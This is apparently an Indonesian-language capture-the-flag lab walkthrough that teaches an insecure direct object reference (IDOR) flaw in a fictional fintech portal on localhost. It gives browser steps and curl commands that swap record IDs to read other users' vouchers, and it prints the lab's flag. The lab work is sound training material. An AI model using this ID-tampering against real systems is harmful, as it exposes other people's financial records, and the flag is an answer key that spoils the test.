# Panduan Praktik Terbimbing: Investigasi & Pembuktian IDOR pada VaultPay Enterprise

Dalam panduan terarah ini, kamu akan mempraktikkan proses audit keamanan profesional terhadap portal perbendaharaan institusional **VaultPay Enterprise (Fintech B2B Treasury & Wire Transfer Portal)** yang beroperasi pada `http://127.0.0.1:8011`. Metodologi pengujian mengikuti tahapan standar industri: **Observasi $\rightarrow$ Hipotesis $\rightarrow$ Pembuktian PoC $\rightarrow$ Eksfiltrasi Bukti**.

---

### Langkah 1: Observasi & Pemetaan Sistem (Reconnaissance)
1. Buka peramban web dan akses portal VaultPay Enterprise:
   `http://127.0.0.1:8011`
2. Lakukan login menggunakan akun staf analis likuiditas junior:
   - **Username:** `alice`
   - **Password:** `password123`
3. Amati antarmuka **Dispatched Wire Settlement Ledger**:
   - Alice hanya ditugaskan 1 transaksi kawat resmi pada siklus fiskal ini: **`TRX-VLT-1001`** (Cloud Infrastructure Compute Retainer - $4,950.00).
4. Klik tombol **"View Voucher #1 &rarr;"** pada baris transaksi tersebut.
5. Perhatikan bilah alamat (*address bar*) peramban:
   `http://127.0.0.1:8011/wire/1`
   - Angka `1` merupakan referensi objek langsung (*Direct Object Reference*) yang diteruskan langsung ke query database backend.

---

### Langkah 2: Pengujian Hipotesis & Parameter Tampering (IDOR)
Ujilah hipotesis keamanan: *Apakah backend memvalidasi bahwa voucher nomor 2 benar-benar dimiliki oleh sesi login Alice?*

1. Tetap berada di halaman peramban, lalu klik bilah alamat (*address bar*).
2. Ubah URL dari:
   `http://127.0.0.1:8011/wire/1`
   menjadi:
   `http://127.0.0.1:8011/wire/2`
3. Tekan **Enter** dan perhatikan respons sistem:
   - **Status Respon:** Berhasil dimuat dengan status `200 OK`.
   - **Temuan Bukti:** Voucher yang ditampilkan adalah **`TRX-VLT-1002`** bernilai $1,450.00 milik analis senior (**Robert Sterling / Bob**)!
   - **Analisis Kritis:** Cookie sesi otentikasi Alice tetap aktif, namun server mengizinkan akses ke catatan finansial Bob tanpa verifikasi hak kepemilikan objek (*Horizontal Privilege Escalation*).

> [!NOTE]
> **💡 Di Balik Layar: Apa yang terjadi di server?**  
> Saat kamu mengirim request `GET /wire/2`, server Flask mengeksekusi:  
> `SELECT * FROM wires WHERE id = 2;`  
> Server tidak mengecek apakah `wire.user_id == session['user_id']`. Akibatnya, siapapun yang mengetahui nomor transaksi Bob bisa langsung membacanya!

---

### Langkah 3: Eksfiltrasi Dokumen Berstatus Rahasia (Voucher #42)
Dalam program bug bounty institusional, eksfiltrasi catatan transaksi eksekutif berstatus rahasia (*Restricted Sovereign Ledger*) merupakan bukti dampak kritis (*Critical Severity*).

1. Ujilah ID khusus yang dialokasikan untuk transaksi audit otoritas moneter / eksekutif:
   `http://127.0.0.1:8011/wire/42`  
   atau  
   `http://127.0.0.1:8011/invoice/42`
2. Sistem akan merender **Official Wire Settlement Voucher** berstatus **RESTRICTED**:
   - **Kode Referensi:** `TRX-VLT-9901-SOVEREIGN`
   - **Nilai Transaksi:** `$99,999.00`
   - **Originator:** VaultPay Sovereign Escrow Reserve (Marcus Reid - VP Corporate Controller)
   - **Clearing Record & Compliance Memo:** Memuat segel validasi autoritatif audit kepatuhan SOX-404:
     `ZITERA{b10k3n_4cc355_c0ntr01_m45t3r}`
3. Salin flag validasi tersebut untuk dikirimkan (*submit*) ke formulir tantangan Zitera Lab.

---

### Langkah 4: Verifikasi Bukti Menggunakan cURL Terminal
Kamu juga dapat mereproduksi dan membuktikan celah ini secara programatik melalui terminal menggunakan perintah berikut:

```bash
# 1. Login sebagai Alice dan simpan sesi cookie
curl -s -c cookies.txt -d "username=alice&password=password123" http://127.0.0.1:8011/login

# 2. Akses voucher transaksi milik orang lain (#2) menggunakan cookie Alice
curl -s -b cookies.txt http://127.0.0.1:8011/wire/2

# 3. Eksfiltrasi catatan rahasia voucher #42 untuk mendapatkan Flag
curl -s -b cookies.txt http://127.0.0.1:8011/invoice/42
```

**Contoh Output Respons JSON / HTML:**
```json
{
  "wire_id": 42,
  "reference": "TRX-VLT-9901-SOVEREIGN",
  "amount": 99999.00,
  "status": "SETTLED",
  "compliance_memo": "SOX-404 Clearance Seal: ZITERA{b10k3n_4cc355_c0ntr01_m45t3r}"
}
```

Flag `ZITERA{b10k3n_4cc355_c0ntr01_m45t3r}` berhasil dikonfirmasi dan diverifikasi 100%!
